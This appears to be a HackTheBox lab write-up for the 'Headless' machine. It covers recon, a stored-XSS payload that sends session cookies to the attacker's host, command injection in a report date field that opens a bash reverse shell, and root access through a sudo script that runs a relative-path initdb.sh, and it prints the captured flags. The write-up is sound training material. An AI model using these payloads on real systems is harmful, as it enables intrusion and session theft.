---
render_with_liquid: false
title: HackTheBox Writeup  Headless
date: 2024-04-14 10:37:22 +1400
tags: [hackthebox, nmap, linux, feroxbuster, python-flask, xss, xss-stored, command-injection, sudo, bash-script, misconfiguration]
---



# Recon
---

## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/Headless]
└─$ pt init '10.10.11.8 Headless'
+----------+--------+------------+----------+
| PROFILE  | STATUS |     IP     |  DOMAIN  |
+----------+--------+------------+----------+
| headless | on     | 10.10.11.8 | Headless |
+----------+--------+------------+----------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Sun Apr 14 10:37:22 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,5000, Headless
Nmap scan report for Headless (10.10.11.8)
Host is up, received user-set (0.18s latency).
Scanned at 2024-04-14 10:37:22 CST for 297s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJXBmWeZYo1LR50JTs8iKyICHT76i7+fBPoeiKDXRhzjsfMWruwHrosHoSwRxiqUdaJYLwJgWOv+jFAB45nRQHw=
|   256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICkBEMKoic0Bx5yLYG4DIT5G797lraNQsG5dtyZUl9nW
5000/tcp open  upnp?   syn-ack ttl 63
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Sun, 14 Apr 2024 02:33:37 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest:
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=9%D=4/14%Time=661B4169%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\
SF:x20Python/3\.11\.2\r\nDate:\x20Sun,\x2014\x20Apr\x202024\x2002:33:37\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x202799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Z
SF:fs;\x20Path=/\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\
SF:x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\
SF:x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-wid
SF:th,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Under\x20Construct
SF:ion</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20b
SF:ody\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\
SF:x20'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20di
SF:splay:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justif
SF:y-content:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:align-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20height:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x20
SF:0,\x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"<!DOCTYP
SF:E\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x
SF:20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20resp
SF:onse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20vers
SF:ion\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\
SF:x20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x
SF:20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sun Apr 14 10:42:19 2024 -- 1 IP address (1 host up) scanned in 296.76 seconds
```

## 5000 - HTTP : Welcome to our site


### Info

```ruby
http://Headless:5000 [200] [Under Construction] [Werkzeug/2.2.2 Python/3.11.2] [Flask:2.2.2,Python:3.11.2] [968b35f6dd9380b1b262cbdd332de1deace7fe4e]
```

![](/assets/obsidian/b7ed1e5ec0394b9d776534d800b50f6c.png)

### Directory

```bash
feroxbuster -k -t 100 -u "http://$(pt get rhost):5000" -o ferox_5000.txt
```

```bash
200      GET       93l      179w     2363c http://headless:5000/support
200      GET       96l      259w     2799c http://headless:5000/
500      GET        5l       37w      265c http://headless:5000/dashboard
```

# User Flag
---

## Shell as dvir

### 80 - Support Form : XSS (Stored)

> http://headless:5000/support

- Test XSS, payload :

```javascript
<img src="http://10.10.14.39/a"/><a href="http://10.10.14.39/b">Test</a>
```

![](/assets/obsidian/e28dff16797c3e263bce7bb05409151e.png)

The attack was detected, and it shows `a report with your browser information has been sent to the administrators for investigation`

![](/assets/obsidian/8f6a5078dec19a3ec73101ce21f28769.png)

So my request data might be viewed by a user (admin) from a web panel that could render javascripts

I can try to inject XSS payloads in my user agent header and see if it was rendered

![](/assets/obsidian/dfe6e013d27339ab17d1efff1092d027.png)

My web server on port `80` did received a callback from the machine

![](/assets/obsidian/a161ead573264410cadec1022f912cdf.png)

Next, steal cookies from the user

- Payload :

```bash
<img src=x onerror=this.src="http://10.10.14.39/c/"+btoa(document.cookie);>
```

![](/assets/obsidian/193a18056915b58853a9988555ec882a.png)

```bash
[2024-04-15 15:37:12] 10.10.11.8:35582 "GET /c/aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1" 404 19
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Headless]
└─$ echo aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= | base64 -d
is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
```

### 80 - Dashboard : Command injection

After setting the cookie, I was able to access `/dashboard`

![](/assets/obsidian/89dcedb144ea94933cdb21ba1fc306e2.png)

The `generate report` function takes `date` from user input

![](/assets/obsidian/7655a4080a59e91e6cdd051ffe0c7f8a.png)

The `data` value might be pass into a system command to generate report, try command injection

- Payload : `2023-09-15#; id #`

![](/assets/obsidian/3c382ca8dc7582707c9e5322f247e56e.png)

It's vulnerable to command injection, get a shell

- Payload : `2023-09-15#; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.39/1111 0>&1' #`

![](/assets/obsidian/50f3ef9389f1bb8e2858910449682dde.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Headless]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.39] from (UNKNOWN) [10.10.11.8] 43554
bash: cannot set terminal process group (1396): Inappropriate ioctl for device
bash: no job control in this shell
dvir@headless:~/app$ /usr/bin/script -qc /bin/bash /dev/null
/usr/bin/script -qc /bin/bash /dev/null
dvir@headless:~/app$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/Headless]
└─$ stty raw -echo;fg
stty rows 50 columns 209
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
dvir@headless:~/app$ stty rows 50 columns 209
dvir@headless:~/app$ id
uid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)
dvir@headless:~/app$ cat ~/user.txt
98b00990c9c341b5f00fc55754df1873
```

# Root Flag
---

## From dvir to root


### Sudo - Bash script : Arbitrary path to execute bash script

We can run `/usr/bin/syscheck` as root without password

```bash
dvir@headless:~/app$ sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```

`syscheck` is a bash script

```bash
dvir@headless:~/app$ ls -la /usr/bin/syscheck
-r-xr-xr-x 1 root root 768 Feb  2 16:11 /usr/bin/syscheck
dvir@headless:~/app$ file /usr/bin/syscheck
/usr/bin/syscheck: Bourne-Again shell script, ASCII text executable
```

The bash script executes `./initdb.sh` in current directory where I'm in when `initdb.sh` is not in process list

```bash
dvir@headless:~/app$ cat /usr/bin/syscheck

#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```

Create a bash script named `initdb.sh` that executes `bash`

```bash
dvir@headless:~/app$ cd /tmp
dvir@headless:/tmp$ echo '/bin/bash' > initdb.sh
dvir@headless:/tmp$ chmod +x initdb.sh
```

Run the `syscheck` script

```bash
dvir@headless:/tmp$ sudo /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 2.0G
System load average:  0.00, 0.00, 0.00
Database service is not running. Starting it...
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
52eb04691902f819282f98f490ba7594
```

# Additional
---
